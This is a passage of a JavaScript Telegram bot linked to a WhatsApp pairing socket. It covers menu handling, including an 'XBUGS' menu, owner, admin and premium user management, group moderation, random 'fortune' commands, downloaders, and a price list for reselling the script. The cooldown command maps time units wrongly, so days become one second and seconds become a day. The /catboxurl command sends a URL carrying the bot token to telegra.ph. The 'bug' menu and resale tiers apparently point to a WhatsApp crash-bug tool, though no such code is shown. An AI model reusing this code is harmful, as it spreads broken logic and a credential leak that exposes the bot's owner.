        ["Version", getLocalVersion()],
        ["Commit", remote.sha.slice(0, 7)],
        ["Status", "✅ Up to date"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function mainKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "XBUGS", callback_data: "menu:bug" },
        { text: "XSETTINGS", callback_data: "menu:settings" }
      ],
      [
        { text: "DEVELOPERS", callback_data: "menu:developers" },
        { text: "TOOLS", callback_data: "menu:tools" }
      ],
      [
        { text: "TQTO", callback_data: "menu:tqto" }
      ]
    ]
  }
}

function subKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "BACK TO HOME", callback_data: "menu:home" }]
    ]
  }
}

const MENU_BUILDERS = {
  home: (ctx) => ({ msg: buildHomeMessage(ctx), kb: mainKeyboard() }),
  bug: () => ({ msg: buildBugMessage(), kb: subKeyboard() }),
  settings: () => ({ msg: buildSettingsMessage(), kb: subKeyboard() }),
  developers: () => ({ msg: buildDevelopersMessage(), kb: subKeyboard() }),
  tools: () => ({ msg: buildToolsMessage(), kb: subKeyboard() }),
  tqto: () => ({ msg: buildTqtoMessage(), kb: subKeyboard() })
}

async function sendMenu(ctx, key) {
  const builder = MENU_BUILDERS[key]
  if (!builder) return
  try {
    const { msg, kb } = builder(ctx)
    await ctx.sendRichMessage(msg, { reply_markup: kb })
  } catch (e) {
    console.log(chalk.red("sendMenu error:"), e.message)
    try { await ctx.reply("❌ Gagal memuat menu.") } catch {}
  }
}

async function navigateMenu(ctx, key) {
  const builder = MENU_BUILDERS[key]
  if (!builder) return
  const { msg, kb } = builder(ctx)
  try { await ctx.deleteMessage() } catch {}
  try {
    await ctx.sendRichMessage(msg, { reply_markup: kb })
  } catch (e) {
    console.log(chalk.red("navigateMenu error:"), e.message)
  }
}

bot.start(async (ctx) => {
  await sendMenu(ctx, "home")
})

bot.command("menu", async (ctx) => {
  await sendMenu(ctx, "home")
})

bot.on("callback_query", async (ctx, next) => {
  const data = ctx.callbackQuery?.data
  if (!data || !data.startsWith("menu:")) return next()
  await ctx.answerCbQuery().catch(() => {})
  const key = data.replace("menu:", "")
  if (!MENU_BUILDERS[key]) return
  await navigateMenu(ctx, key)
})

bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) return ctx.reply("❌ Socket belum siap.")
    if (isWhatsAppConnected && sock.user) return ctx.reply("✅ WhatsApp sudah terhubung.")
    if (pairingMessage) return ctx.reply("⚠️ Pairing masih aktif.")
    const args = ctx.message.text.split(" ")
    if (args.length < 2) return ctx.reply("Example:\n/connect 628xxxx")
    let phone = args[1].replace(/[^0-9]/g, "")
    if (phone.startsWith("08")) phone = "62" + phone.slice(1)
    if (phone.length < 8 || phone.length > 15) return ctx.reply("❌ Nomor tidak valid.")
    await sleep(1000)
    const code = await sock.requestPairingCode(phone)
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.")
    const fmt = code.match(/.{1,4}/g)?.join("-") || code
    const msg = await ctx.sendRichMessage(buildPairingMessage(phone, fmt))
    pairingMessage = { chatId: msg.chat.id, messageId: msg.message_id }
    setTimeout(() => { pairingMessage = null }, 60000)
  } catch (e) {
    console.log("Pairing error:", e)
    pairingMessage = null
    ctx.reply("❌ Gagal pairing!")
  }
})

bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try { await sock.logout() } catch {}
      sock = null
    }
    const d = deleteSession()
    pairingMessage = null
    ctx.reply(d ? "🗑️ Session dihapus, /connect kembali" : "⚠️ Session tidak ditemukan")
  } catch {
    ctx.reply("❌ Gagal hapus session")
  }
})

bot.command("delpair", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ")
  if (!args[1]) return ctx.reply("⚠️ Contoh: /delpair 628xxxx")
  const num = args[1].replace(/[^0-9]/g, "")
  ctx.reply(`🗑️ Pairing ${num} dihapus.`)
})

bot.command("status", checkOwner, async (ctx) => {
  await ctx.sendRichMessage(buildStatusMessage(), { reply_markup: subKeyboard() })
})

bot.command("runtime", async (ctx) => {
  await ctx.sendRichMessage(buildRuntimeMessage(), { reply_markup: subKeyboard() })
})

bot.command("mode", async (ctx) => {
  await ctx.sendRichMessage(buildModeMessage(), { reply_markup: subKeyboard() })
})

bot.command("self", checkOwner, async (ctx) => {
  currentMode = "self"
  saveJSON(PATHS.MODE, { mode: "self" })
  ctx.reply("🔒 Bot di kunci untuk Owner.")
})

bot.command("public", checkOwner, async (ctx) => {
  currentMode = "public"
  saveJSON(PATHS.MODE, { mode: "public" })
  ctx.reply("📢 Bot dibuka untuk publik.")
})

bot.command("groupon", checkOwner, async (ctx) => {
  currentGroupMode = "on"
  saveJSON(PATHS.GROUP_MODE, { group: "on" })
  ctx.reply("👥 Group Only ON.")
})

bot.command("groupoff", checkOwner, async (ctx) => {
  currentGroupMode = "off"
  saveJSON(PATHS.GROUP_MODE, { group: "off" })
  ctx.reply("🌍 Group Only OFF.")
})

bot.command("setcd", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ")
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0")
  if (args[1] === "0") {
    COOLDOWN_TIME = 0
    COOLDOWN_TEXT = "0s"
    return ctx.reply("✅ Cooldown off")
  }
  const m = args[1].match(/^(\d+)([dhms])$/)
  if (!m) return ctx.reply("⚠️ Format salah!")
  const v = parseInt(m[1])
  const u = m[2]
  const mult = u === "d" ? 1000 : u === "m" ? 60000 : u === "h" ? 3600000 : 86400000
  COOLDOWN_TIME = v * mult
  COOLDOWN_TEXT = args[1]
  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`)
})

bot.command("cekowner", async (ctx) => {
  await ctx.sendRichMessage(buildOwnerInfoMessage(ctx), { reply_markup: subKeyboard() })
})

bot.command("cekpremium", async (ctx) => {
  await ctx.sendRichMessage(buildPremiumCheckMessage(ctx), { reply_markup: subKeyboard() })
})

bot.command("addadmin", checkOwner, async (ctx) => {
  let uid
  if (ctx.message.reply_to_message) uid = String(ctx.message.reply_to_message.from.id)
  else uid = ctx.message.text.split(" ")[1]
  if (!uid) return ctx.reply("⚠️ Contoh: /addadmin 1113570863")
  if (adminList.includes(uid)) return ctx.reply("⚠️ Sudah admin!")
  adminList.push(uid)
  saveJSON(PATHS.ADMIN_USER, adminList)
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ADMIN ADDED ✦")
    .divider()
    .table(
      [
        ["Field", "Value"],
        ["User ID", uid],
        ["Total Admin", String(adminList.length)],
        ["Status", "✅ Success"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("deladmin", checkOwner, async (ctx) => {
  let uid
  if (ctx.message.reply_to_message) uid = String(ctx.message.reply_to_message.from.id)
  else uid = ctx.message.text.split(" ")[1]
  if (!uid) return ctx.reply("⚠️ Contoh: /deladmin 1113570863")
  if (!adminList.includes(uid)) return ctx.reply("⚠️ Bukan admin!")
  adminList = adminList.filter((x) => x !== uid)
  saveJSON(PATHS.ADMIN_USER, adminList)
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ADMIN DELETED ✦")
    .divider()
    .table(
      [
        ["Field", "Value"],
        ["User ID", uid],
        ["Total Admin", String(adminList.length)],
        ["Status", "✅ Removed"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("addprem", checkOwner, async (ctx) => {
  let uid
  if (ctx.message.reply_to_message) uid = String(ctx.message.reply_to_message.from.id)
  else uid = ctx.message.text.split(" ")[1]
  if (!uid) return ctx.reply("⚠️ Contoh: /addprem 1113570863")
  if (premiumUsers.includes(uid)) return ctx.reply("⚠️ Sudah premium!")
  premiumUsers.push(uid)
  saveJSON(PATHS.PREMIUM_USER, premiumUsers)
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ PREMIUM ADDED ✦")
    .divider()
    .table(
      [
        ["Field", "Value"],
        ["User ID", uid],
        ["Total Premium", String(premiumUsers.length)],
        ["Status", "✅ Success"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("delprem", checkAdmin, async (ctx) => {
  let uid
  if (ctx.message.reply_to_message) uid = String(ctx.message.reply_to_message.from.id)
  else uid = ctx.message.text.split(" ")[1]
  if (!uid) return ctx.reply("⚠️ Contoh: /delprem 1113570863")
  if (!premiumUsers.includes(uid)) return ctx.reply("⚠️ Bukan premium!")
  premiumUsers = premiumUsers.filter((x) => x !== uid)
  saveJSON(PATHS.PREMIUM_USER, premiumUsers)
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ PREMIUM DELETED ✦")
    .divider()
    .table(
      [
        ["Field", "Value"],
        ["User ID", uid],
        ["Total Premium", String(premiumUsers.length)],
        ["Status", "✅ Removed"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("addgroupremium", checkOwner, async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya di group")
  const gid = String(ctx.chat.id)
  if (premiumGroups.includes(gid)) return ctx.reply("⚠️ Sudah premium")
  premiumGroups.push(gid)
  saveJSON(PATHS.PREMIUM_GROUPS, premiumGroups)
  ctx.reply("✅ Group premium ditambahkan")
})

bot.command("delgroupremium", checkOwner, async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya di group")
  const gid = String(ctx.chat.id)
  premiumGroups = premiumGroups.filter((x) => x !== gid)
  saveJSON(PATHS.PREMIUM_GROUPS, premiumGroups)
  ctx.reply("✅ Group premium dihapus")
})

bot.command("list", checkAdmin, async (ctx) => {
  await ctx.sendRichMessage(buildUserListMessage(), { reply_markup: subKeyboard() })
})

bot.command("anticulik", checkOwner, async (ctx) => {
  const arg = ctx.message.text.split(" ")[1]
  if (!arg) return ctx.reply("Gunakan: /anticulik on / off / autoreject")
  if (arg === "on") { antiCulik = true; autoReject = false; ctx.reply("✅ AntiCulik ON") }
  else if (arg === "off") { antiCulik = false; ctx.reply("❌ AntiCulik OFF") }
  else if (arg === "autoreject") { antiCulik = true; autoReject = true; ctx.reply("🚫 Auto Reject ON") }
})

bot.command("addsafe", checkOwner, async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya di group")
  const gid = String(ctx.chat.id)
  if (!whitelistGroups.includes(gid)) {
    whitelistGroups.push(gid)
    saveJSON(PATHS.SAFE_GROUPS, whitelistGroups)
  }
  ctx.reply("✅ Group ditandai SAFE")
})

bot.command("delsafe", checkOwner, async (ctx) => {
  const gid = String(ctx.chat.id)
  whitelistGroups = whitelistGroups.filter((x) => x !== gid)
  saveJSON(PATHS.SAFE_GROUPS, whitelistGroups)
  ctx.reply("❌ SAFE dihapus")
})

bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya di group")
  const m = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(m.status)) return ctx.reply("❌ Hanya admin")
  const a = ctx.message.text.split(" ")[1]
  const gid = String(ctx.chat.id)
  if (a === "on") {
    if (!antiFotoGroups.includes(gid)) { antiFotoGroups.push(gid); saveJSON(PATHS.ANTI_FOTO, antiFotoGroups) }
    return ctx.reply("✅ Anti Foto ON")
  }
  if (a === "off") {
    antiFotoGroups = antiFotoGroups.filter((x) => x !== gid)
    saveJSON(PATHS.ANTI_FOTO, antiFotoGroups)
    return ctx.reply("❌ Anti Foto OFF")
  }
  ctx.reply("Gunakan: /antifoto on / off")
})

bot.command("antivideo", async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya di group")
  const m = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(m.status)) return ctx.reply("❌ Hanya admin")
  const a = ctx.message.text.split(" ")[1]
  const gid = String(ctx.chat.id)
  if (a === "on") {
    if (!antiVideoGroups.includes(gid)) { antiVideoGroups.push(gid); saveJSON(PATHS.ANTI_VIDEO, antiVideoGroups) }
    return ctx.reply("✅ Anti Video ON")
  }
  if (a === "off") {
    antiVideoGroups = antiVideoGroups.filter((x) => x !== gid)
    saveJSON(PATHS.ANTI_VIDEO, antiVideoGroups)
    return ctx.reply("❌ Anti Video OFF")
  }
  ctx.reply("Gunakan: /antivideo on / off")
})

bot.on("photo", async (ctx) => {
  const gid = String(ctx.chat.id)
  if (!antiFotoGroups.includes(gid)) return
  try {
    await ctx.deleteMessage()
    await ctx.reply(`⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang kirim foto di grup ini!`)
  } catch {}
})

bot.on("video", async (ctx) => {
  const gid = String(ctx.chat.id)
  if (!antiVideoGroups.includes(gid)) return
  try {
    await ctx.deleteMessage()
    await ctx.reply(`⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang kirim video di grup ini!`)
  } catch {}
})

bot.on("my_chat_member", async (ctx) => {
  try {
    const st = ctx.update.my_chat_member.new_chat_member.status
    if (st !== "member" && st !== "administrator") return
    if (!antiCulik) return
    const gid = ctx.chat.id
    if (whitelistGroups.includes(String(gid))) return
    const from = ctx.update.my_chat_member.from
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(gid, "🚫 Auto keluar (AntiCulik)")
        await ctx.telegram.banChatMember(gid, from.id).catch(() => {})
        await ctx.telegram.leaveChat(gid)
      } catch {}
      return
    }
    pendingGroups.set(gid, {
      userId: from.id,
      username: from.username,
      fullName: `${from.first_name || ""} ${from.last_name || ""}`.trim(),
      groupName: ctx.chat.title
    })
    for (const ownerId of ownerUsers) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
          `${emo(EMOJI.WARNING, "🚨")} <b>BOT DICULIK</b>\n\n📛 Grup: ${ctx.chat.title}\n🆔 ID: <code>${gid}</code>\n\n👤 Pelaku:\n• Nama: ${from.first_name || "-"} ${from.last_name || ""}\n• Username: @${from.username || "-"}\n• ID: <code>${from.id}</code>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [Markup.button.callback("✅ Izinkan", `allow_${gid}`), Markup.button.callback("❌ Tolak", `deny_${gid}`)]
            ]).reply_markup
          }
        )
      } catch {}
    }
  } catch (e) { console.log("AntiCulik err:", e) }
})

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true })
  const act = ctx.match[1]
  const gid = Number(ctx.match[2])
  const data = pendingGroups.get(gid)
  try { await ctx.deleteMessage() } catch {}
  pendingGroups.delete(gid)
  if (act === "allow") {
    await ctx.reply("✅ Bot diizinkan")
    try { await ctx.telegram.sendMessage(gid, "✅ Bot diizinkan oleh owner") } catch {}
  } else {
    await ctx.reply("❌ Bot ditolak")
    try {
      await ctx.telegram.sendMessage(gid, "❌ Bot ditolak oleh owner")
      if (data?.userId) await ctx.telegram.banChatMember(gid, data.userId).catch(() => {})
      await ctx.telegram.leaveChat(gid)
    } catch {}
  }
})

bot.command("jodoh", async (ctx) => {
  const p = Math.floor(Math.random() * 100) + 1
  const st = p > 70 ? "Cocok banget! 💖" : p > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅"
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ LOVE COMPATIBILITY ✦")
    .divider()
    .table([["Item", "Value"], ["Kecocokan", `${p}%`], ["Status", st]], { bordered: true, striped: true, hasHeader: true })
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("koin", async (ctx) => {
  const h = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰"
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ COIN FLIP ✦")
    .divider()
    .paragraph(`Hasil: ${HTML.bold(h)}`)
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("suit", async (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"]
  const user = ctx.message.text.split(" ")[1]?.toLowerCase()
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas")
  const botC = pilihan[Math.floor(Math.random() * 3)]
  const hasil = user === botC ? "Seri 🤝" : ((user === "batu" && botC === "gunting") || (user === "gunting" && botC === "kertas") || (user === "kertas" && botC === "batu")) ? "Kamu menang! 🎉" : "Bot menang! 😯"
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ROCK PAPER SCISSORS ✦")
    .divider()
    .table([["Player", "Pilihan"], ["Kamu", user], ["Bot", botC], ["Hasil", hasil]], { bordered: true, striped: true, hasHeader: true })
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("motivasi", async (ctx) => {
  const q = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌹 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ DAILY MOTIVATION ✦")
    .divider()
    .blockQuote(HTML.italic(q[Math.floor(Math.random() * q.length)]))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("shio", async (ctx) => {
  const r = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ZODIAC FORTUNE ✦")
    .divider()
    .paragraph(r[Math.floor(Math.random() * r.length)])
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("kepribadian", async (ctx) => {
  const r = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💗", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ PERSONALITY TEST ✦")
    .divider()
    .paragraph(r[Math.floor(Math.random() * r.length)])
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("karir", async (ctx) => {
  const r = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ FUTURE CAREER ✦")
    .divider()
    .paragraph(r[Math.floor(Math.random() * r.length)])
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("level", async (ctx) => {
  const l = Math.floor(Math.random() * 100) + 1
  const st = l > 80 ? "Level Dewa 😎" : l > 50 ? "Cukup menawan 😊" : "Biasa saja 🥱"
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ATTRACTIVENESS LEVEL ✦")
    .divider()
    .table([["Item", "Value"], ["Level", `${l}%`], ["Status", st]], { bordered: true, striped: true, hasHeader: true })
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("harilahir", async (ctx) => {
  const h = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BIRTH DAY GUESS ✦")
    .divider()
    .paragraph(`Random: ${h[Math.floor(Math.random() * h.length)]}`)
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("cekmasadepan", async (ctx) => {
  let name = "Kamu"
  if (ctx.message.reply_to_message) name = ctx.message.reply_to_message.from.first_name || "Dia"
  else {
    const a = ctx.message.text.split(" ")
    if (a.length > 1) name = a.slice(1).join(" ")
  }
  const r = (arr) => arr[Math.floor(Math.random() * arr.length)]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ FUTURE PREDICTION ✦")
    .paragraph(`Untuk: ${HTML.bold(name)}`)
    .divider()
    .table(
      [
        ["Aspek", "Hasil"],
        ["👔 Profesi", r(["Programmer", "Pengusaha", "Dokter", "YouTuber", "Polisi", "Guru", "Artis", "Atlet", "Pilot", "Chef"])],
        ["💰 Kekayaan", r(["Miliarder", "Mapan", "Berkecukupan", "Kaya Raya", "Sukses Finansial"])],
        ["❤️ Jodoh", r(["Setia", "Pengertian", "Romantis", "Baik Hati", "Soulmate"])],
        ["🏠 Rumah", r(["Mewah Jakarta", "Minimalis Bali", "Modern Bandung", "Villa Puncak"])],
        ["🚗 Kendaraan", r(["Pajero", "Alphard", "Tesla", "BMW", "Mercedes"])],
        ["🍀 Nasib", r(["Sukses Besar", "Hidup Bahagia", "Pensiun Muda", "Terkenal"])]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(HTML.italic("Hasil ini hanya hiburan ya! Masa depan ada di tanganmu sendiri."))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ")
  let nama = "Kamu"
  if (args.length > 1) nama = args.slice(1).join(" ")
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ NAME FORTUNE ✦")
    .paragraph(`Untuk: ${HTML.bold(nama)}`)
    .divider()
    .blockQuote(HTML.italic(hasil[Math.floor(Math.random() * hasil.length)]))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("time", async (ctx) => {
  const now = new Date()
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }))
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }))
  const fJ = (d) => d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })
  const fT = (d) => d.toLocaleDateString("id-ID", { weekday: "long", day: "numeric", month: "long", year: "numeric" })
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ INDONESIA TIME ✦")
    .divider()
    .heading(3, "🟢 WIB")
    .paragraph(`${fJ(wib)} — ${fT(wib)}`)
    .heading(3, "🟡 WITA")
    .paragraph(`${fJ(wita)} — ${fT(wita)}`)
    .heading(3, "🔵 WIT")
    .paragraph(`${fJ(wit)} — ${fT(wit)}`)
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("cuaca", async (ctx) => {
  const kondisi = ["Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️", "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"]
  const suhu = Math.floor(Math.random() * 20) + 20
  const lem = Math.floor(Math.random() * 50) + 40
  const k = kondisi[Math.floor(Math.random() * kondisi.length)]
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ WEATHER FORECAST ✦")
    .divider()
    .table(
      [
        ["Item", "Value"],
        ["Kondisi", k],
        ["Suhu", `${suhu}°C`],
        ["Kelembaban", `${lem}%`]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("harga", async (ctx) => {
  const msg = new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ SCRIPT PRICING ✦")
    .divider()
    .table(
      [
        ["Paket", "Harga"],
        ["Full Up", "8.000"],
        ["Reseller", "13.000"],
        ["Partner", "20.000"],
        ["Moderator", "30.000"],
        ["Owner", "40.000"],
        ["Tangan Kanan", "55.000"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .paragraph("Chat admin untuk pembelian:")
    .paragraph(HTML.url("https://t.me/Skyzael", "Developer 1") + " | " + HTML.url("https://t.me/usernamecpm", "Developer 2"))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
  await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
})

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]
  if (!input) return ctx.reply("Masukkan username channel.")
  try {
    const chat = await ctx.telegram.getChat(input)
    ctx.reply(`📢 ID Channel: ${chat.id}`)
  } catch { ctx.reply("Channel tidak ditemukan.") }
})

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ")
  if (!text) return ctx.reply("❌ Masukkan teks!")
  try {
    const url = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`
    const res = await axios.get(url, { responseType: "arraybuffer" })
    await ctx.replyWithSticker({ source: Buffer.from(res.data) })
  } catch { ctx.reply("❌ API error.") }
})

bot.command("catbox", async (ctx) => {
  const url = ctx.message.text.split(" ")[1]
  if (!url || !url.includes("files.catbox.moe")) return ctx.reply("❌ URL Catbox tidak valid!")
  await ctx.reply("⏳ Mengunduh...")
  try {
    const ext = url.split(".").pop().toLowerCase()
    if (["jpg", "jpeg", "png", "gif", "webp"].includes(ext)) return ctx.replyWithPhoto(url)
    if (["mp4", "mkv", "avi", "mov"].includes(ext)) return ctx.replyWithVideo(url)
    if (["mp3", "wav", "ogg"].includes(ext)) return ctx.replyWithAudio(url)
    await ctx.replyWithDocument(url)
  } catch { ctx.reply("❌ Gagal.") }
})

bot.command("catboxurl", async (ctx) => {
  if (!ctx.message.reply_to_message) return ctx.reply("📸 Reply foto dengan /catboxurl")
  const replied = ctx.message.reply_to_message
  let fileId = null
  if (replied.photo) fileId = replied.photo[replied.photo.length - 1].file_id
  else if (replied.document && replied.document.mime_type?.startsWith("image/")) fileId = replied.document.file_id
  else return ctx.reply("❌ Harus berupa foto!")
  await ctx.reply("⏳ Mengupload...")
  try {
    const file = await ctx.telegram.getFile(fileId)
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`
    const postData = JSON.stringify([{ url: fileUrl }])
    const options = {
      hostname: "telegra.ph",
      path: "/upload",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) }
    }
    const request = https.request(options, (response) => {
      let data = ""
      response.on("data", (chunk) => (data += chunk))
      response.on("end", () => {
        try {
          const result = JSON.parse(data)
          if (result[0] && result[0].src) {
            ctx.reply(`✅ Upload Berhasil!\n\n🔗 https://telegra.ph${result[0].src}`)
          } else { ctx.reply("❌ Gagal upload.") }
        } catch { ctx.reply("❌ Error parsing response.") }
      })
    })
    request.write(postData)
    request.end()
  } catch { ctx.reply("❌ Terjadi kesalahan.") }
})

bot.command("tiktokdl", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim()
  if (!url) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/...")
  const w = await ctx.reply("⏳ Memproses...")
  try {
    const { data } = await axios.get("https://tikwm.com/api/", { params: { url }, timeout: 20000 })
    if (!data?.data) return ctx.reply("❌ Gagal ambil data.")
    const d = data.data
    const v = d.play || d.hdplay || d.wmplay
    if (!v) return ctx.reply("❌ Tidak ada video.")
    const vid = await axios.get(v, { responseType: "arraybuffer", timeout: 30000 })
    await ctx.replyWithVideo({ source: Buffer.from(vid.data) }, { supports_streaming: true })
  } catch { ctx.reply("❌ Gagal unduh.") }
  finally { try { await ctx.deleteMessage(w.message_id) } catch {} }
})

bot.command("snack", async (ctx) => {
  const url = ctx.message.text.split(" ")[1]
